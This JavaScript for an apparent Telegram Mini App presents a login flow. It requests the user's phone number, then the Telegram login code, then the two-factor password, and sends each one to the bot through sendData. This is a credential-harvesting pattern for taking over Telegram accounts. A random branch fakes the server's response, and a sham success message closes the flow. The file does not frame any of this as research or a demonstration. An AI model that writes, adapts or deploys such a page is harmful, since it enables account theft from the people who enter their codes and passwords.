document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('2faInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');

    loginBtn.addEventListener('click', async () => {
        // Анимация: скрываем кнопку, показываем форму
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        loadingSpinner.classList.remove('hidden');

        // Запрос контакта с улучшенной обработкой
        tg.requestContact()
            .then((contact) => {
                if (contact && contact.phone_number) {
                    phoneInput.value = contact.phone_number;
                    phoneInput.classList.remove('hidden');
                    loadingSpinner.classList.add('hidden');
                    submitBtn.classList.remove('hidden');
                    submitBtn.textContent = 'Поделиться номером';
                    errorMsg.classList.add('hidden');

                    // Отправка номера боту
                    tg.sendData(JSON.stringify({ action: 'share_phone', phone: contact.phone_number }));
                } else {
                    throw new Error('Contact denied');
                }
            })
            .catch((error) => {
                console.error('Request contact error:', error);
                loadingSpinner.classList.add('hidden');
                errorMsg.classList.remove('hidden');
                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
                // Кнопка "Войти" остаётся (reset частичный)
                setTimeout(() => {
                    loginBtn.classList.remove('hidden');
                    loginBtn.style.opacity = '1';
                    authForm.classList.add('hidden');
                }, 2000);
            });
    });

    submitBtn.addEventListener('click', () => {
        const action = submitBtn.textContent;
        if (action === 'Поделиться номером') {
            // Уже отправлено, переходим к коду
            phoneInput.classList.add('hidden');
            codeInput.classList.remove('hidden');
            submitBtn.textContent = 'Отправить код';
            return;
        }

        if (action === 'Отправить код') {
            const code = codeInput.value;
            if (!code) return alert('Введите код');
            tg.sendData(JSON.stringify({ action: 'verify_code', code: code }));
            showLoading();
            // Имитация (в реале бот обработает)
            setTimeout(() => {
                if (Math.random() > 0.5) {
                    codeInput.classList.add('hidden');
                    twoFaInput.classList.remove('hidden');
                    submitBtn.textContent = 'Подтвердить 2FA';
                    hideLoading();
                } else {
                    showSuccess();
                }
            }, 2000);
            return;
        }

        if (action === 'Подтвердить 2FA') {
            const password = twoFaInput.value;
            if (!password) return alert('Введите пароль');
            tg.sendData(JSON.stringify({ action: 'verify_2fa', password: password }));
            showLoading();
            setTimeout(showSuccess, 1500);
            return;
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.classList.add('hidden');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.classList.remove('hidden');
    }

    function showSuccess() {
        hideLoading();
        successMsg.classList.remove('hidden');
        tg.sendData(JSON.stringify({ action: 'auth_success' }));
        setTimeout(() => tg.close(), 2000);
    }

    // Reset для кнопки "Войти" при ошибке (уже в catch)
});